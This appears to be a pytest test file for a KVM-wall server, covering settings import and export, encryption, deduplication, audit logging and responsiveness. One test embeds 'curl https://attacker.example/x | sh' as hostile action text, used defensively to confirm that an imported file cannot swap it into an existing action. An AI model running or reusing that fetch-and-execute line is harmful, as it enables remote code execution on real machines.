        made_up = json.dumps({**F, "lock": saved["users"][0]["auth"], "sealed": saved["devices"][0]["secret"]})
        reply = looked(admin, made_up, PASSWORD)
        print("\na device's saved password as file content, opened with the admin's own password:", reply.status_code, reply.json()["code"])
        assert (reply.status_code, reply.json()["code"]) == (422, "damaged")
        # a file's content put where a device's password is kept does not open there
        file = json.loads(admin.post("/api/v1/export", json={"password": PASSWORD, "passphrase": PASSPHRASE, "parts": ["devices"]}).text)
        with pytest.raises(Exception):  # noqa: B017
            admin.core.vault.decrypt(file["sealed"], saved["devices"][0]["id"])  # type: ignore[attr-defined]
        again = json.loads(admin.post("/api/v1/export", json={"password": PASSWORD, "passphrase": PASSPHRASE, "parts": ["devices"]}).text)
        assert file["lock"]["kdf"]["salt"] != again["lock"]["kdf"]["salt"] and file["lock"]["key"] != again["lock"]["key"] and file["sealed"]["nonce"] != again["sealed"]["nonce"]


# --- how long it holds everybody up ---------------------------------------------------------------------------


def test_how_long_the_wall_stands_still_for_a_file_of_the_largest_kind(tmp_path: Path) -> None:
    from tests.fake_kvm import make_device_certificate

    pem = make_device_certificate(tmp_path / "cert")[0].read_text(encoding="ascii")
    file = plain(
        # (One certificate on all of them, and each marked as "keep both": the most a file can bring, by weight.)
        devices=[{"url": nowhere(1000 + i), "kind": "kvmd", "name": f"KVM {i}", "password": "p" * 30, "group": f"rack {i % 40}", "cert_pem": pem, "keep_both": True} for i in range(2000)],
        actions=[{"name": f"action {i}", "kind": "text", "text": "t" * 200} for i in range(500)],
    )
    print(f"\nfile: {len(file)} characters")
    with wall(tmp_path / "w") as admin:
        stop, worst, phase = threading.Event(), {"read": 0.0, "import": 0.0, "wall": 0.0, "idle": 0.0}, ["idle"]

        def pinger() -> None:
            client = visitor(admin, 50070)
            while not stop.is_set():
                started = time.perf_counter()
                client.get("/healthz")
                worst[phase[0]] = max(worst[phase[0]], time.perf_counter() - started)
                time.sleep(0.002)

        thread = threading.Thread(target=pinger)
        thread.start()
        time.sleep(0.5)
        phase[0] = "read"
        started = time.perf_counter()
        there = looked(admin, file)
        read_took = time.perf_counter() - started
        phase[0] = "import"
        started = time.perf_counter()
        reply = taken(admin, file, ("devices", "actions"))
        import_took = time.perf_counter() - started
        time.sleep(0.2)
        stop.set()
        thread.join()
        assert there.status_code == 200 and reply.status_code == 200 and reply.json()["devices"] == 2000
        print(f"read: {read_took:.2f} s (everybody else waited up to {worst['read']:.2f} s) | take in: {import_took:.2f} s (up to {worst['import']:.2f} s) | idle: {worst['idle']:.3f} s")
        assert max(worst["read"], worst["import"]) < 1.0, "a file holds every tile up for a second or more"


# --- what one file can do to the listing of the wall ------------------------------------------------------------


@pytest.mark.parametrize("mark", ["aa:" + "0" * 16, "own:" + "0" * 16, "cert:" + "ab" * 32])
def test_devices_that_all_say_they_are_one_device(tmp_path: Path, mark: str) -> None:
    # The form asks before it adds a second address of one device, and "keep both" gives the tile a mark of
    # its own (own:<its id>). A file brought the mark along, for as many devices as it liked, and each tile
    # was told of all the others: a quarter of a gigabyte to list a wall of two thousand.
    count = 300
    file = json.dumps({**F, "devices": [{"url": nowhere(2000 + i), "kind": "kvmd", "ident": mark} for i in range(count)]}, separators=(",", ":"))
    with wall(tmp_path) as admin:
        there = looked(admin, file).json()
        reply = taken(admin, file, ("devices",))
        assert reply.status_code == 200
        saved = json.loads((tmp_path / "qkvm.json").read_text(encoding="utf-8"))["devices"]
        seen = admin.get("/api/v1/wall")
        twins = sum(len(d["same_as"]) for d in seen.json()["devices"])
        if mark.startswith("aa:"):
            # What a device says it is: one of them is that device, and the others are it again.
            assert reply.json()["devices"] == 1 and saved[0]["ident"] == mark
            assert [d["new"] for d in there["devices"]].count(True) == 1 and there["devices"][1]["same_as"]
        else:
            # A mark this program makes itself is taken from no file: these are devices that say nothing of themselves.
            assert reply.json()["devices"] == count and {d["ident"] for d in saved} == {""}
        assert twins == 0 and len(seen.content) < 300_000


def test_a_tile_is_told_of_a_few_others_that_are_the_same_device_and_not_of_hundreds(tmp_path: Path) -> None:
    # (However they came to be there: a settings file from before the form asked, one written by hand.)
    with wall(tmp_path) as admin:
        assert taken(admin, json.dumps({**F, "devices": [{"url": nowhere(4000 + i), "kind": "kvmd"} for i in range(60)]}), ("devices",)).json()["devices"] == 60
    path = tmp_path / "qkvm.json"
    said = json.loads(path.read_text(encoding="utf-8"))
    for device in said["devices"]:
        device["ident"] = "aa:" + "0" * 16
    for file in (path, tmp_path / "qkvm.bak"):
        file.write_text(json.dumps(said), encoding="utf-8")
    with wall(tmp_path, sign_in=False) as admin:
        assert admin.post("/api/v1/login", json={"name": "admin", "password": PASSWORD}).status_code == 200
        from qkvm import server

        listed = admin.get("/api/v1/wall").json()["devices"]
        assert len(listed) == 60 and {len(d["same_as"]) for d in listed} == {server.MOST_TWINS}


def test_a_tile_that_was_told_to_stay_beside_its_twin_stays_so_on_the_wall_it_is_taken_to(tmp_path: Path) -> None:
    from tests.fake_kvm import make_device_certificate

    pem = make_device_certificate(tmp_path / "its-own")[0].read_text(encoding="ascii")
    both = [{"url": "https://192.168.1.20", "kind": "kvmd", "cert_pem": pem, "name": "At home"}, {"url": "https://kvm.example", "kind": "kvmd", "cert_pem": pem, "name": "From outside", "keep_both": True}]
    with wall(tmp_path / "one") as admin:
        there = looked(admin, plain(devices=both)).json()
        assert [d["new"] for d in there["devices"]] == [True, True]
        assert taken(admin, plain(devices=both), ("devices",)).json()["devices"] == 2
        listed = admin.get("/api/v1/wall").json()["devices"]
        assert [d["same_as"] for d in listed] == [[], []]  # two tiles, and nobody is asked about them again
        made = admin.post("/api/v1/export", json={"password": PASSWORD, "passphrase": "", "parts": ["devices"]}).json()["devices"]
        assert [d.get("keep_both", False) for d in made] == [False, True]  # and it goes along again
    # Without that word, the second is the first again, and is left out and said.
    with wall(tmp_path / "two") as admin:
        both[1].pop("keep_both")
        there = looked(admin, plain(devices=both)).json()
        assert [(d["new"], d["same_as"]) for d in there["devices"]] == [(True, ""), (False, "At home")]
        assert taken(admin, plain(devices=both), ("devices",)).json()["devices"] == 1


def test_what_the_activity_log_says_of_devices_that_came_from_a_file(tmp_path: Path) -> None:
    with wall(tmp_path) as admin:
        typed = admin.post("/api/v1/devices", json={"url": nowhere(3000), "kind": "kvmd", "tls": "pinned", "force": True, "name": "typed by hand"})
        assert typed.status_code == 201, typed.text
        assert taken(admin, plain(devices=[{"url": nowhere(3001), "kind": "kvmd", "name": "came from a file", "tls": "insecure", "open_url": "https://elsewhere.example/"}], alerts={"enabled": True}), ("devices", "alerts")).status_code == 200
        entries = admin.get("/api/v1/audit").json()["entries"]
        for entry in entries:
            if entry["event"] in ("device_added", "import_done"):
                print("\n", {k: v for k, v in entry.items() if k != "time"}, end="")
        said = json.dumps(entries)
        assert "typed by hand" in said and nowhere(3000) in said
        assert "came from a file" in said or nowhere(3001) in said, "the log names the device that was typed, and not the one a file brought"


def test_no_device_is_talked_to_for_a_file(tmp_path: Path, fake: FakeKvm) -> None:
    file = sealed(devices=[{"url": fake.url, "kind": "kvmd", "password": "secret", "name": "from a file"}], alerts={"enabled": True, "webhook": fake.url + "/hook", "link": fake.url})
    with wall(tmp_path) as admin:
        before = fake.state.requests
        assert looked(admin, file, PASSPHRASE).status_code == 200
        assert taken(admin, file, ("devices", "alerts"), PASSPHRASE).json()["devices"] == 1
        time.sleep(1.0)
        print("\nrequests the device saw for the reading and the taking in:", fake.state.requests - before)
        assert fake.state.requests == before
        device = admin.get("/api/v1/wall").json()["devices"][0]["id"]
        deadline = time.monotonic() + 5
        while admin.get("/api/v1/status").json()[device]["state"] != "online" and time.monotonic() < deadline:
            time.sleep(0.05)
        assert fake.state.requests > before  # later, when the tile is looked at


def test_a_saved_text_that_nobody_here_has_read(tmp_path: Path, fake: FakeKvm) -> None:
    # On the wall: "Lock the screen", a key combination. In the file: a text of the same name, which was
    # "another action" because it was of another kind, and whose text the wall shows to nobody once it is saved.
    file = sealed(actions=[
        {"name": "Lock the screen", "kind": "text", "text": "curl https://attacker.example/x | sh", "enter": True, "danger": False},
        {"name": "  lock THE screen ", "kind": "text", "text": "the same again, written another way"},
        {"name": "Unlock disk", "kind": "text", "text": "the passphrase of the disk", "enter": True, "danger": True},
    ])  # fmt: skip
    with wall(tmp_path) as admin:
        device = add(admin, fake.url, name="Rack KVM")
        assert admin.post("/api/v1/actions", json={"name": "Lock the screen", "kind": "keys", "keys": "MetaLeft,KeyL"}).status_code == 201
        account(admin, "olga", "operator")
        there = looked(admin, file, PASSPHRASE).json()["actions"]
        # An action is here by its name. And of one that is new, what it types is said before it is taken.
        assert [(a["name"], a["new"]) for a in there] == [("Lock the screen", False), ("lock THE screen", False), ("Unlock disk", True)]
        assert (there[2]["text"], there[2]["enter"], there[2]["danger"], there[0]["text"]) == ("the passphrase of the disk", True, True, "")
        assert taken(admin, file, ("actions",), PASSPHRASE).json()["actions"] == 1
        listed = browser(admin, "olga").get("/api/v1/actions").json()["actions"]
        assert [(a["name"], a["kind"]) for a in listed] == [("Lock the screen", "keys"), ("Unlock disk", "text")]
        locks = next(a for a in listed if a["name"] == "Lock the screen")
        assert browser(admin, "olga", port=50009).post(f"/api/v1/devices/{device}/actions", json={"action": "custom", "custom_id": locks["id"]}).status_code == 200
        assert not any("curl" in action for action in fake.state.actions)
